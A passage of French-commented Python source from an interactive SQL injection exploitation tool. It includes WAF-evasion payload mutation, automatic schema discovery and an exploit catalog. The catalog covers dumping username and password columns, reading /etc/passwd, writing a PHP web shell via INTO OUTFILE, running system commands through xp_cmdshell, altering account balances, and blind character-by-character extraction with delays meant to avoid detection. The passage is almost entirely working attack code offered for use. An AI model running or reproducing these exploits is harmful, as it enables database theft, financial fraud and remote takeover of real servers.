            results.append(result)
            
            if result.get('vulnerable', False):
                ai_hits += 1
                print(f"\n{Colors.PURPLE}🤖 AI BREAKTHROUGH #{ai_hits} 🤖{Colors.END}")
                print(f"  Adaptive Payload: {payload[:80]}...")
            
            time.sleep(0.15)
        
        self.display_battle_summary(attack, target_url, results, ai_hits)
        return results

    def ai_mutate_payload(self, payload):
        """Mutation de payload avec techniques IA simulées"""
        mutations = [
            # Substitution intelligente
            lambda x: x.replace('SELECT', ['ELECT', 'S/**/ELECT', 'SE/**/LECT'][random.randint(0,2)]),
            lambda x: x.replace('UNION', ['UN/**/ION', 'UNI/**/ON', '/*!UNION*/'][random.randint(0,2)]),
            lambda x: x.replace(' AND ', [' /**/AND/**/ ', ' %0AAND%0A ', ' A/**/N/**/D '][random.randint(0,2)]),
            
            # Insertion de caractères adaptatifs
            lambda x: x.replace('=', ['/**/=/**/', '=/**/'].pop(random.randint(0,1))),
            lambda x: x.replace("'", ["'/**/", "/**/'", "%27"][random.randint(0,2)]),
            
            # Techniques de fragmentation avancées
            lambda x: ''.join(c + ['', '/**/', '%0A'][random.randint(0,2)] if c in 'AEIOU' else c for c in x),
            
            # Variations de timing sophistiquées
            lambda x: x.replace('SLEEP(5)', f'SLEEP({random.randint(3,8)})') if 'SLEEP' in x else x,
            lambda x: x.replace('5000000', str(random.randint(3000000, 8000000))) if 'BENCHMARK' in x else x
        ]
        
        # Application aléatoire de mutations
        mutated = payload
        for _ in range(random.randint(1, 3)):
            mutation = random.choice(mutations)
            try:
                mutated = mutation(mutated)
            except:
                continue
        
        return mutated

    def interactive_exploitation(self, target_url, vulnerable_results):
        """Module d'exploitation interactif pour les vulnérabilités détectées"""
        if not vulnerable_results:
            return
        
        print(f"\n{Colors.BG_RED}{Colors.WHITE}{Colors.BOLD} 🎯 VULNÉRABILITÉS DÉTECTÉES - MODULE D'EXPLOITATION 🎯 {Colors.END}")
        print(f"Nombre de failles trouvées: {Colors.RED}{Colors.BOLD}{len(vulnerable_results)}{Colors.END}")
        
        # Découverte auto de l'info DB (nom/version/user) puis du schéma
        print(f"\n{Colors.BOLD}🔎 Recon automatique de la base de données...{Colors.END}")
        db_info = self.auto_discover_db_info(target_url)
        if db_info:
            print(f"{Colors.CYAN}DB Info:{Colors.END}")
            if 'database' in db_info:
                print(f"  - Database: {db_info['database']}")
            if 'version' in db_info:
                print(f"  - Version: {db_info['version']}")
            if 'user' in db_info:
                print(f"  - User: {db_info['user']}")
        else:
            print(f"{Colors.YELLOW}ℹ️ Aucune info DB directe trouvée (tentatives multi-SGBD).{Colors.END}")

        print(f"\n{Colors.BOLD}🔎 Pré-découverte du schéma (tables et colonnes)...{Colors.END}")
        schema_hints = self.auto_discover_schema(target_url)
        self.last_schema_hints = schema_hints or {}
        if schema_hints:
            print(f"{Colors.CYAN}Schéma détecté:{Colors.END}")
            for tbl, cols in list(schema_hints.items())[:10]:  # affiche un aperçu
                print(f"  - {tbl}({', '.join(cols[:8])}{'...' if len(cols)>8 else ''})")
            if len(schema_hints) > 10:
                print(f"  ... ({len(schema_hints)-10} autres tables)")
        else:
            print(f"{Colors.YELLOW}ℹ️ Aucun indice de schéma obtenu automatiquement.{Colors.END}")
        
        exploit_choice = input(f"\n{Colors.BOLD}🔥 Voulez-vous exploiter ces vulnérabilités? (y/n): {Colors.END}").strip().lower()
        if exploit_choice != 'y':
            return
        
        # Catalogue d'exploits personnalisables
        exploit_catalog = {
            'data_extraction': {
                'name': '🗂️ Extraction de Données',
                'description': 'Extrait des données spécifiques de la base de données',
                'usage': "Permet d'extraire des lignes depuis une table. Renseignez la table, les colonnes à retourner et éventuellement une clause WHERE (ex: username='admin'). Limitez avec LIMIT.",
                'params': {
                    'table': {'desc': 'Nom de la table à cibler', 'default': 'users', 'type': 'string'},
                    'columns': {'desc': 'Colonnes à extraire (séparées par virgules)', 'default': 'username,password', 'type': 'string'},
                    'where_clause': {'desc': 'Condition WHERE (optionnel)', 'default': '', 'type': 'string'},
                    'limit': {'desc': 'Nombre max de résultats', 'default': '10', 'type': 'int'}
                },
                'payload_template': "' UNION SELECT {columns} FROM {table} {where} LIMIT {limit}--"
            },
            'database_info': {
                'name': '🔍 Information Base de Données',
                'description': 'Récupère des informations sur la structure de la BDD',
                'usage': "Explore la structure: version, base actuelle, utilisateur DB, tables et colonnes. Sélectionnez un type d'info. Pour 'columns', indiquez la table.",
                'params': {
                    'info_type': {
                        'desc': 'Type d\'info (version/database/user/tables/columns)', 
                        'default': 'version', 
                        'type': 'choice',
                        'choices': ['version', 'database', 'user', 'tables', 'columns']
                    },
                    'target_table': {'desc': 'Table cible (pour columns)', 'default': '', 'type': 'string'}
                },
                'payload_templates': {
                    'version': "' UNION SELECT @@version,2,3--",
                    'database': "' UNION SELECT database(),2,3--", 
                    'user': "' UNION SELECT user(),2,3--",
                    'tables': "' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()--",
                    'columns': "' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='{target_table}'--"
                }
            },
            'file_operations': {
                'name': '📁 Opérations Fichiers',
                'description': 'Lecture/écriture de fichiers sur le serveur',
                'usage': "Lit un fichier serveur (read) ou écrit un fichier (write) si le SGBD le permet. Attention: write est intrusif. Fournissez le chemin complet.",
                'params': {
                    'operation': {
                        'desc': 'Type d\'opération (read/write)', 
                        'default': 'read', 
                        'type': 'choice',
                        'choices': ['read', 'write']
                    },
                    'file_path': {'desc': 'Chemin du fichier', 'default': '/etc/passwd', 'type': 'string'},
                    'content': {'desc': 'Contenu à écrire (pour write)', 'default': '<?php system($_GET[c]); ?>', 'type': 'string'}
                },
                'payload_templates': {
                    'read': "' UNION SELECT load_file('{file_path}'),2,3--",
                    'write': "' UNION SELECT '{content}',2,3 INTO OUTFILE '{file_path}'--"
                }
            },
            'update_balance': {
                'name': '💳 Update Balance',
                'description': "Ajuste le solde d'un utilisateur (SET ou ADD)",
                'usage': "Met à jour la colonne de solde pour un utilisateur. Choisissez 'add' pour ajouter un montant ou 'set' pour imposer une valeur. Indiquez la table (ex: users), la colonne de solde (ex: balance), la colonne d'identifiant (ex: username) et la valeur d'identifiant.",
                'params': {
                    'mode': {
                        'desc': 'Action (set/add)',
                        'default': 'add',
                        'type': 'choice',
                        'choices': ['set', 'add']
                    },
                    'table': {'desc': 'Table cible', 'default': 'users', 'type': 'string'},
                    'balance_column': {'desc': 'Colonne balance', 'default': 'balance', 'type': 'string'},
                    'id_column': {'desc': 'Colonne identifiant', 'default': 'username', 'type': 'string'},
                    'id_value': {'desc': 'Valeur identifiant (ex: votre login)', 'default': 'admin', 'type': 'string'},
                    'amount': {'desc': 'Montant (nombre)', 'default': '100', 'type': 'int'}
                },
                'payload_templates': {
                    # SET balance = amount
                    'set': "'; UPDATE {table} SET {balance_column}={{amount}} WHERE {id_column}='{id_value}';--",
                    # ADD to existing balance (MySQL syntax)
                    'add': "'; UPDATE {table} SET {balance_column}={balance_column}+{{amount}} WHERE {id_column}='{id_value}';--"
                }
            },
            'command_execution': {
                'name': '⚡ Exécution de Commandes',
                'description': 'Exécute des commandes système via SQL injection',
                'usage': "Tente d'exécuter une commande système via fonctions spécifiques au SGBD. Très intrusif et rarement autorisé en prod. Choisissez le SGBD et la commande.",
                'params': {
                    'command': {'desc': 'Commande à exécuter', 'default': 'whoami', 'type': 'string'},
                    'db_type': {
                        'desc': 'Type de base de données (mysql/mssql/postgres)', 
                        'default': 'mysql', 
                        'type': 'choice',
                        'choices': ['mysql', 'mssql', 'postgres']
                    }
                },
                'payload_templates': {
                    'mysql': "'; SELECT sys_exec('{command}');--",
                    'mssql': "'; EXEC xp_cmdshell '{command}';--",
                    'postgres': "'; SELECT system('{command}');--"
                }
            },
            'blind_extraction': {
                'name': '🔍 Extraction Aveugle',
                'description': 'Extraction de données par technique boolean/time-based',
                'usage': "Extrait une valeur caractère par caractère avec tests booléens ou temporels. Indiquez la donnée cible, la table, la condition WHERE (pour réduire la portée), la méthode et la longueur max.",
                'params': {
                    'target_data': {'desc': 'Donnée à extraire (ex: password)', 'default': 'password', 'type': 'string'},
                    'target_table': {'desc': 'Table source', 'default': 'users', 'type': 'string'},
                    'condition': {'desc': 'Condition WHERE', 'default': 'username=\'admin\'', 'type': 'string'},
                    'method': {
                        'desc': 'Méthode (boolean/time)', 
                        'default': 'boolean', 
                        'type': 'choice',
                        'choices': ['boolean', 'time']
                    },
                    'max_length': {'desc': 'Longueur max à extraire', 'default': '32', 'type': 'int'}
                },
                'payload_templates': {
                    'boolean': "' AND ASCII(SUBSTRING((SELECT {target_data} FROM {target_table} WHERE {condition}),{position},1))={ascii_value}--",
                    'time': "' AND IF(ASCII(SUBSTRING((SELECT {target_data} FROM {target_table} WHERE {condition}),{position},1))={ascii_value},SLEEP(3),0)--"
                }
            }
        }
        
        for i, result in enumerate(vulnerable_results, 1):
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.BOLD}Vulnérabilité #{i}:{Colors.END}")
            print(f"Payload: {Colors.YELLOW}{result['payload'][:100]}{'...' if len(result['payload']) > 100 else ''}{Colors.END}")
            print(f"Score: {Colors.RED}{result.get('vulnerability_score', 0)}/15{Colors.END}")
            
            exploit_vuln = input(f"\n{Colors.BOLD}🎯 Exploiter cette vulnérabilité? (y/n): {Colors.END}").strip().lower()
            if exploit_vuln != 'y':
                continue
            
            # Afficher le catalogue d'exploits
            print(f"\n{Colors.BOLD}📋 CATALOGUE D'EXPLOITS DISPONIBLES:{Colors.END}")
            for key, exploit in self._filtered_exploits_by_category(exploit_catalog).items():
                print(f"{Colors.CYAN}{key}{Colors.END}: {exploit['name']} - {exploit['description']}")
            
            exploit_type = input(f"\n{Colors.BOLD}Choisissez un exploit: {Colors.END}").strip()
            
            if exploit_type not in exploit_catalog:
                print(f"{Colors.RED}❌ Exploit non reconnu.{Colors.END}")
                continue
            
            # Configuration de l'exploit
            exploit_config = exploit_catalog[exploit_type]
            print(f"\n{Colors.BOLD}⚙️ CONFIGURATION DE L'EXPLOIT: {exploit_config['name']}{Colors.END}")
            print(f"Description: {exploit_config['description']}")
            if 'usage' in exploit_config and exploit_config['usage']:
                print(f"Utilisation: {exploit_config['usage']}")
            
            params = {}
            for param_name, param_info in exploit_config['params'].items():
                # Suggestions basées sur la catégorie et le schéma
                hint = self._suggest_param_value(param_name, param_info, self.selected_category, self.last_schema_hints)
                suggested = f" (suggestion: {hint})" if hint else ""
                if param_info['type'] == 'choice':
                    print(f"\n{Colors.YELLOW}Choix pour {param_name}:{Colors.END} {', '.join(param_info['choices'])}{suggested}")
                
                user_input = input(f"{Colors.BOLD}{param_name}{Colors.END} ({param_info['desc']})[{param_info['default']}] {suggested}: ").strip()
                
                if not user_input:
                    params[param_name] = param_info['default']
                else:
                    if param_info['type'] == 'int':
                        try:
                            params[param_name] = str(int(user_input))
                        except ValueError:
                            params[param_name] = param_info['default']
                    else:
                        params[param_name] = user_input
                
                print(f"✓ {param_name} = {Colors.GREEN}{params[param_name]}{Colors.END}")
            
            # Génération et exécution des exploits
            print(f"\n{Colors.BOLD}🚀 LANCEMENT DE L'EXPLOIT...{Colors.END}")
            
            if exploit_type == 'blind_extraction':
                self.execute_blind_extraction(target_url, result, params)
            else:
                # Si l'exploit est une extraction de données, tenter smart UNION dump
                if 'payload_template' in exploit_config and 'FROM {table}' in exploit_config['payload_template']:
                    cols = params.get('columns', 'username,password')
                    table = params.get('table', 'users')
                    limit = int(params.get('limit', '50')) if 'limit' in params else 50
                    print(f"\n{Colors.BOLD}🧪 SMART UNION DUMP:{Colors.END} {table} -> {cols} (limit {limit})")
                    rows = self.smart_union_dump(target_url, table, cols, limit)
                    if rows:
                        print(f"{Colors.GREEN}✅ Dump réussi: {len(rows)} lignes{Colors.END}")
                        for r in rows[:10]:
                            print('  - ' + ', '.join(r))
                    else:
                        print(f"{Colors.YELLOW}ℹ️ Dump non concluant, fallback à l'exploit standard.{Colors.END}")
                        self.execute_standard_exploit(target_url, result, exploit_config, params)
                else:
                    self.execute_standard_exploit(target_url, result, exploit_config, params)

    def _filtered_exploits_by_category(self, exploit_catalog):
        if not self.selected_category:
            return exploit_catalog
        mapping = {
            'bypass': ['blind_extraction', 'database_info', 'data_extraction'],
            'insert': ['update_balance', 'data_extraction', 'file_operations'],
            'privilege': ['data_extraction', 'database_info', 'blind_extraction'],
            'discovery': ['database_info', 'data_extraction']
        }
        keys = mapping.get(self.selected_category, list(exploit_catalog.keys()))
        return {k: v for k, v in exploit_catalog.items() if k in keys}

    def _suggest_param_value(self, param_name, param_info, category, schema_hints):
        try:
            if category == 'insert' and param_name in ['table', 'balance_column', 'id_column']:
                cols = []
                for tbl, c in (schema_hints or {}).items():
                    if param_name == 'table' and ('user' in tbl or 'account' in tbl):
                        return tbl
                    if param_name == 'balance_column':
                        cols.extend([x for x in c if re.search(r"balance|credit|wallet|points|amount|credits", x, re.I)])
                    if param_name == 'id_column':
                        cols.extend([x for x in c if re.search(r"user_id|username|email|login|id", x, re.I)])
                return cols[0] if cols else ''
            if category in ['discovery', 'privilege'] and param_name == 'info_type':
                return 'tables'
            if param_name == 'columns' and schema_hints:
                # Suggest common sensitive fields
                sens = set()
                for _, c in schema_hints.items():
                    for x in c:
                        if re.search(r"username|email|password|balance|credit", x, re.I):
                            sens.add(x)
                return ','.join(list(sens)[:3]) if sens else ''
        except Exception:
            return ''
        return ''

    def execute_standard_exploit(self, target_url, base_result, exploit_config, params):
        """Exécute un exploit standard avec les paramètres donnés"""
        try:
            if 'payload_templates' in exploit_config:
                # Exploits avec templates multiples
                if 'info_type' in params:
                    template = exploit_config['payload_templates'][params['info_type']]
                elif 'operation' in params:
                    template = exploit_config['payload_templates'][params['operation']]
                elif 'db_type' in params:
                    template = exploit_config['payload_templates'][params['db_type']]
                elif 'mode' in params and params['mode'] in exploit_config['payload_templates']:
                    template = exploit_config['payload_templates'][params['mode']]
                else:
                    template = list(exploit_config['payload_templates'].values())[0]
            else:
                # Exploit avec template unique
                template = exploit_config['payload_template']
            
            # Déterminer l'action concrète et recommandations
            action_label = self._infer_action_label(exploit_config, params)
            recommendations = self._recommend_params(action_label, self.last_schema_hints)

            # Formatage du payload
            try:
                if 'where_clause' in params and params['where_clause']:
                    params['where'] = f"WHERE {params['where_clause']}"
                else:
                    params['where'] = ''
                
                exploit_payload = template.format(**params)
            except KeyError as e:
                print(f"{Colors.RED}❌ Erreur de formatage: paramètre manquant {e}{Colors.END}")
                return
            
            print(f"{Colors.BOLD}Payload généré:{Colors.END}")
            print(f"{Colors.CYAN}{exploit_payload}{Colors.END}")
            # Explication en BLEU MAJUSCULE + recommandations
            if action_label:
                print(f"{Colors.BLUE}{Colors.BOLD}{action_label.upper()}{Colors.END}")
            # Intention du payload
            intents = self._explain_payload_intent(exploit_payload)
            if intents:
                print(f"{Colors.BLUE}Intention:{Colors.END} {', '.join(intents)}")
            if recommendations:
                for k, v in recommendations.items():
                    if isinstance(v, list):
                        if v:
                            print(f"- {k}: {', '.join(v[:5])}{'...' if len(v)>5 else ''}")
                    elif v:
                        print(f"- {k}: {v}")
            
            # Permettre de modifier les paramètres sans impacter la requête d'origine
            confirm = input(f"\n{Colors.BOLD}Exécuter ce payload? (y/n/edit): {Colors.END}").strip().lower()
            if confirm != 'y':
                if confirm == 'edit':
                    # Boucle d'édition sécurisée: clonage des params et reformatage
                    editable_params = dict(params)
                    print(f"{Colors.YELLOW}🛠️ Édition des paramètres. Laissez vide pour conserver la valeur.{Colors.END}")
                    for param_name, param_info in exploit_config['params'].items():
                        current = editable_params.get(param_name, param_info.get('default', ''))
                        new_val = input(f"{param_name} [{current}]: ").strip()
                        if new_val:
                            editable_params[param_name] = new_val
                    try:
                        if 'where_clause' in editable_params and editable_params['where_clause']:
                            editable_params['where'] = f"WHERE {editable_params['where_clause']}"
                        else:
                            editable_params['where'] = ''
                        edited_payload = template.format(**editable_params)
                        print(f"\n{Colors.BOLD}Payload édité:{Colors.END}")
                        print(f"{Colors.CYAN}{edited_payload}{Colors.END}")
                        intents = self._explain_payload_intent(edited_payload)
                        if intents:
                            print(f"{Colors.BLUE}Intention:{Colors.END} {', '.join(intents)}")
                        run_edit = input(f"\n{Colors.BOLD}Exécuter ce payload édité? (y/n): {Colors.END}").strip().lower() == 'y'
                        if not run_edit:
                            return
                        exploit_payload = edited_payload
                    except Exception as e:
                        print(f"{Colors.RED}❌ Paramètres invalides: {e}{Colors.END}")
                        return
                else:
                    return
            
            print(f"\n{Colors.YELLOW}🎯 Exécution en cours...{Colors.END}")
            
            # Exécution de l'exploit
            result = self.advanced_payload_test(target_url, exploit_payload, "Exploit Test", False)
            
            # Analyse des résultats
            print(f"\n{Colors.BOLD}📊 RÉSULTATS DE L'EXPLOIT:{Colors.END}")
            print(f"Status HTTP: {result.get('status_code', 'N/A')}")
            print(f"Temps de réponse: {result.get('response_time', 'N/A')}ms")
            print(f"Taille réponse: {result.get('content_length', 'N/A')} bytes")
            
            if result.get('vulnerable', False):
                print(f"{Colors.GREEN}✅ Exploit réussi !{Colors.END}")
                # Afficher un premier extrait de données capturées
                try:
                    fbl = result.get('full_battle_log', {}) or {}
                    sample_shown = False
                    # 1) Structured extractions JSON
                    extracted_path = fbl.get('extracted')
                    if extracted_path and os.path.exists(extracted_path):
                        with open(extracted_path, 'r', encoding='utf-8', errors='ignore') as f:
                            data = json.load(f)
                        # Priorité aux lignes tabulaires (rows)
                        rows = data.get('rows') or []
                        if isinstance(rows, list) and rows:
                            first = rows[0]
                            c1 = str(first.get('col1', ''))
                            c2 = str(first.get('col2', ''))
                            print(f"{Colors.CYAN}Extrait:{Colors.END} {c1} , {c2}")
                            sample_shown = True
                        # Sinon afficher une donnée intéressante
                        if not sample_shown:
                            for key in ['credentials_like', 'hashes', 'user_info', 'database_name']:
                                vals = data.get(key)
                                if isinstance(vals, list) and vals:
                                    print(f"{Colors.CYAN}Extrait ({key}):{Colors.END} {vals[0]}")
                                    sample_shown = True
                                    break
                    # 2) Fallback: text-only first line
                    if not sample_shown:
                        txt_only = fbl.get('text_only')
                        if txt_only and os.path.exists(txt_only):
                            with open(txt_only, 'r', encoding='utf-8', errors='ignore') as f:
                                line = f.readline().strip()
                            if line:
                                print(f"{Colors.CYAN}Extrait (texte):{Colors.END} {line[:200]}")
                                sample_shown = True
                    # 3) Final fallback: show beginning of response.txt if present
                    if not sample_shown:
                        body_txt = fbl.get('body_txt')
                        if body_txt and os.path.exists(body_txt):
                            with open(body_txt, 'r', encoding='utf-8', errors='ignore') as f:
                                chunk = f.read(200)
                            if chunk:
                                print(f"{Colors.CYAN}Extrait (html):{Colors.END} {chunk.strip()}")
                except Exception:
                    pass
            else:
                print(f"{Colors.RED}❌ Exploit échoué ou bloqué{Colors.END}")
                # Proposer une relance
                try:
                    retry = input(f"{Colors.BOLD}Relancer l'exploitation avec mêmes paramètres (y/N)? {Colors.END}").strip().lower() == 'y'
                except KeyboardInterrupt:
                    retry = False
                if retry:
                    return self.execute_standard_exploit(target_url, base_result, exploit_config, params)
                
        except Exception as e:
            print(f"{Colors.RED}💥 Erreur lors de l'exécution: {e}{Colors.END}")

    def _infer_action_label(self, exploit_config, params):
        name = (exploit_config.get('name') or '').lower()
        if 'update balance' in name:
            mode = params.get('mode', 'add').lower()
            return 'update balance (+ amount)' if mode == 'add' else 'set balance (= amount)'
        if 'extraction' in name:
            return 'extract data'
        if 'information base' in name or 'information' in name:
            return 'discover schema'
        if 'opérations fichiers' in name or 'file' in name:
            op = params.get('operation', 'read')
            return 'read file' if op == 'read' else 'write file'
        if 'exécution de commandes' in name or 'command' in name:
            return 'execute system command'
        if 'blind' in name:
            m = params.get('method', 'boolean')
            return 'extract data (blind/time-based)' if m == 'time' else 'extract data (blind/boolean)'
        return ''

    def _recommend_params(self, action_label, schema_hints):
        rec = {}
        try:
            if 'balance' in action_label or 'set balance' in action_label or 'update balance' in action_label:
                # Trouver tables/colonnes candidates
                balance_like = re.compile(r"balance|credit|wallet|points|amount|credits", re.I)
                id_like = re.compile(r"user_id|username|email|login|id", re.I)
                table_candidates = []
                balance_candidates = set()
                id_candidates = set()
                for tbl, cols in (schema_hints or {}).items():
                    if 'user' in tbl or any('user' in c for c in cols):
                        table_candidates.append(tbl)
                    for c in cols:
                        if balance_like.search(c):
                            balance_candidates.add(c)
                        if id_like.search(c):
                            id_candidates.add(c)
                rec['tables_suspectes'] = table_candidates[:5]
                rec['colonnes_balance_suspectes'] = list(balance_candidates)[:5]
                rec['colonnes_identifiant_suspectes'] = list(id_candidates)[:5]
                rec['conseil'] = "Utilisez votre identifiant réel (username/email), testez d'abord SET avec petite valeur."
            elif 'discover schema' in action_label:
                rec['conseil'] = "Lister d'abord tables puis colonnes de la table utilisateur avant extraction."
            elif 'extract data' in action_label:
                rec['conseil'] = "Ciblez des colonnes sensibles (users: username,email,password/balance). Limitez avec WHERE."
            elif 'read file' in action_label:
                rec['fichiers_communs'] = ['/etc/passwd', 'C:/Windows/win.ini']
            elif 'execute system command' in action_label:
                rec['commandes_exemple'] = ['whoami', 'id', 'uname -a']
        except Exception:
            return rec
        return rec

    def _explain_payload_intent(self, payload: str):
        """Retourne une explication simple de ce que tente le payload (dump, insert, write, rce, timing, etc.)."""
        p = (payload or '').upper()
        intents = []
        try:
            if 'UNION' in p and 'SELECT' in p:
                intents.append('dump/extraction via UNION SELECT')
            if re.search(r"\bSELECT\b.+\bFROM\b", p):
                intents.append('lecture/dump de données')
            if re.search(r"\bINSERT\b|\bUPDATE\b|\bDELETE\b|\bALTER\b|\bCREATE\b|\bDROP\b", p):
                intents.append('modification/altération de données ou schéma')
            if 'INTO OUTFILE' in p or 'WRITEFILE' in p:
                intents.append('écriture de fichier côté serveur')
            if 'LOAD_FILE' in p or 'PG_READ_FILE' in p:
                intents.append('lecture de fichier côté serveur')
            if 'XP_CMDSHELL' in p or re.search(r"\bSYSTEM\(\"?", p) or 'COPY (SELECT' in p and 'TO PROGRAM' in p:
                intents.append('exécution de commande système (RCE)')
            if 'SLEEP(' in p or 'WAITFOR DELAY' in p or 'PG_SLEEP' in p or 'BENCHMARK(' in p:
                intents.append('déclencheur temporel (time-based)')
        except Exception:
            pass
        return intents or ['opération inconnue (pattern non détecté)']

    def _recommend_exploits_for_results(self, results):
        """Propose dynamiquement des exploits à utiliser selon les signaux observés."""
        try:
            counts = {
                'sql_errors': 0,
                'time_based': 0,
                'critical_status': 0,
                'anomalies': 0,
                'file_ops': 0,
                'rce': 0,
                'union': 0,
                'dml': 0
            }
            for r in results or []:
                payload = (r.get('payload') or '')
                up = payload.upper()
                if r.get('has_sql_errors'): counts['sql_errors'] += 1
                if r.get('is_delayed'): counts['time_based'] += 1
                if r.get('critical_status'): counts['critical_status'] += 1
                if r.get('response_anomalies'): counts['anomalies'] += 1
                if ('INTO OUTFILE' in up) or ('WRITEFILE' in up) or ('LOAD_FILE' in up) or ('PG_READ_FILE' in up): counts['file_ops'] += 1
                if ('XP_CMDSHELL' in up) or (' TO PROGRAM ' in up) or (' SYSTEM(' in up): counts['rce'] += 1
                if ('UNION' in up and 'SELECT' in up) or ('SELECT' in up and 'FROM' in up): counts['union'] += 1
                if re.search(r"\bINSERT\b|\bUPDATE\b|\bDELETE\b|\bCREATE\b|\bDROP\b|\bALTER\b", up): counts['dml'] += 1
            # Prioritize suggestions
            suggestions = []
            if counts['time_based'] > 0:
                suggestions.append('blind_extraction')
            if counts['sql_errors'] > 0 or counts['union'] > 0:
                suggestions.extend(['data_extraction', 'database_info'])
            if counts['file_ops'] > 0:
                suggestions.append('file_operations')
            if counts['rce'] > 0:
                suggestions.append('command_execution')
            if counts['dml'] > 0:
                suggestions.append('update_balance')
            # Always include low-risk discovery if nothing else
            if not suggestions:
                suggestions.append('database_info')
            # De-dup preserving order
            seen = set()
            ordered = []
            for s in suggestions:
                if s not in seen:
                    seen.add(s)
                    ordered.append(s)
            return ordered
        except Exception:
            return ['database_info', 'data_extraction']

    def execute_blind_extraction(self, target_url, base_result, params):
        """Exécute une extraction aveugle caractère par caractère"""
        print(f"\n{Colors.PURPLE}🔍 DÉMARRAGE EXTRACTION AVEUGLE{Colors.END}")
        print(f"Cible: {params['target_data']} depuis {params['target_table']}")
        print(f"Condition: {params['condition']}")
        print(f"Méthode: {params['method']}")
        
        extracted_data = ""
        max_length = int(params['max_length'])
        
        template = "' AND ASCII(SUBSTRING((SELECT {target_data} FROM {target_table} WHERE {condition}),{position},1))={ascii_value}--"
        if params['method'] == 'time':
            template = "' AND IF(ASCII(SUBSTRING((SELECT {target_data} FROM {target_table} WHERE {condition}),{position},1))={ascii_value},SLEEP(3),0)--"
        
        print(f"\n{Colors.BOLD}🎯 Extraction en cours...{Colors.END}")
        
        for position in range(1, max_length + 1):
            print(f"\n{Colors.CYAN}Position {position}/{max_length}:{Colors.END}", end=" ")
            
            found_char = None
            
            # Test des caractères ASCII courants (32-126)
            for ascii_val in range(32, 127):
                test_payload = template.format(
                    target_data=params['target_data'],
                    target_table=params['target_table'],
                    condition=params['condition'],
                    position=position,
                    ascii_value=ascii_val
                )
                
                result = self.advanced_payload_test(target_url, test_payload, "Blind Test", params['method'] == 'time')
                
                # Vérification du succès selon la méthode
                if params['method'] == 'time':
                    success = result.get('is_delayed', False)
                else:
                    success = result.get('vulnerable', False) or result.get('response_time', 0) > 100
                
                if success:
                    found_char = chr(ascii_val)
                    break
                
                # Délai pour éviter la détection
                time.sleep(0.1)
            
            if found_char:
                extracted_data += found_char
                print(f"{Colors.GREEN}'{found_char}'{Colors.END}")
                print(f"{Colors.YELLOW}Données extraites jusqu'à présent: {Colors.BOLD}{extracted_data}{Colors.END}")
            else:
                print(f"{Colors.RED}[FIN]{Colors.END}")
                break
        
        print(f"\n{Colors.BOLD}🏆 EXTRACTION TERMINÉE:{Colors.END}")
        print(f"{Colors.GREEN}Résultat: {Colors.BOLD}{extracted_data}{Colors.END}")
        
        # Sauvegarde optionnelle
        save_extracted = input(f"\n{Colors.BOLD}💾 Sauvegarder les données extraites? (y/n): {Colors.END}").strip().lower()
        if save_extracted == 'y':
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"blind_extraction_{timestamp}.txt"
            try:
                with open(filename, 'w') as f:
                    f.write(f"Extraction aveugle - {datetime.now().isoformat()}\n")
                    f.write(f"Cible: {params['target_data']} FROM {params['target_table']} WHERE {params['condition']}\n")
                    f.write(f"Méthode: {params['method']}\n")
                    f.write(f"Résultat: {extracted_data}\n")
                print(f"{Colors.GREEN}📁 Données sauvegardées: {filename}{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}❌ Erreur sauvegarde: {e}{Colors.END}")

    def extract_data_from_response(self, response_text, params):
        """Tente d'extraire des données utiles de la réponse HTTP"""
        print(f"\n{Colors.BOLD}🔍 ANALYSE DE LA RÉPONSE:{Colors.END}")
        
        # Recherche de patterns intéressants
        patterns = {
            'mysql_version': r'mysql.*?(\d+\.\d+\.\d+)',
            'postgres_version': r'postgresql.*?(\d+\.\d+)',
            'database_name': r'database\(\).*?([a-zA-Z][a-zA-Z0-9_]*)',
            'user_info': r'user\(\).*?([a-zA-Z][a-zA-Z0-9_@]*)',
            'file_content': r'load_file.*?([^\x00-\x1f]+)',
            'table_names': r'table_name.*?([a-zA-Z][a-zA-Z0-9_]*)',
            'passwords': r'password.*?([a-fA-F0-9]{32,}|\$2[aby]\$\d+\$.+)',
            'usernames': r'username.*?([a-zA-Z][a-zA-Z0-9_]{2,})'
        }
        
        found_data = {}
        
        for pattern_name, pattern in patterns.items():
            import re
            matches = re.findall(pattern, response_text.lower(), re.IGNORECASE)
            if matches:
                found_data[pattern_name] = matches
        
        if found_data:
            print(f"{Colors.GREEN}✅ Données extraites détectées:{Colors.END}")
            for data_type, values in found_data.items():
                print(f"  {Colors.CYAN}{data_type}:{Colors.END} {', '.join(set(values))}")
        else:
            print(f"{Colors.YELLOW}ℹ️ Aucune donnée structurée détectée{Colors.END}")
            
            # Affichage d'un échantillon de la réponse
            if response_text and len(response_text) > 100:
                print(f"\n{Colors.BOLD}Échantillon de réponse (100 premiers caractères):{Colors.END}")
                print(f"{Colors.WHITE}{response_text[:100]}...{Colors.END}")

    def auto_discover_schema(self, target_url):
        """Essaie d'obtenir tables et colonnes via injection d'information schema (MySQL-like)."""
        hints = {}
        try:
            # Tables du schéma courant
            payload_tables = "' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()--"
            res_tables = self.advanced_payload_test(target_url, payload_tables, "Schema Discovery", False, include_response_text=True)
            text = (res_tables.get('response_text') or '').lower()
            # Crible basique des noms probable de tables
            possible_tables = re.findall(r"[a-z0-9_]{3,}", text)
            unique_tables = []
            seen = set()
            for t in possible_tables:
                if t not in seen and not t.isdigit():
                    seen.add(t)
                    unique_tables.append(t)
            # Limiter et cibler tables plausibles
            for tbl in unique_tables[:15]:
                # Colonnes par table
                payload_cols = f"' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='{tbl}'--"
                res_cols = self.advanced_payload_test(target_url, payload_cols, "Schema Discovery", False, include_response_text=True)
                ctext = (res_cols.get('response_text') or '').lower()
                cols = [c for c in re.findall(r"[a-z0-9_]{3,}", ctext) if not c.isdigit()]
                # Filtrer doublons, garder quelques colonnes plausibles
                cseen = set()
                filtered = []
                for c in cols:
                    if c not in cseen:
                        cseen.add(c)
                        filtered.append(c)
                if filtered:
                    hints[tbl] = filtered[:20]
        except Exception:
            return hints
        return hints

    def auto_discover_db_info(self, target_url):
        """Tente de récupérer nom de DB, version, et utilisateur courant pour différents SGBD."""
        info = {}
        try:
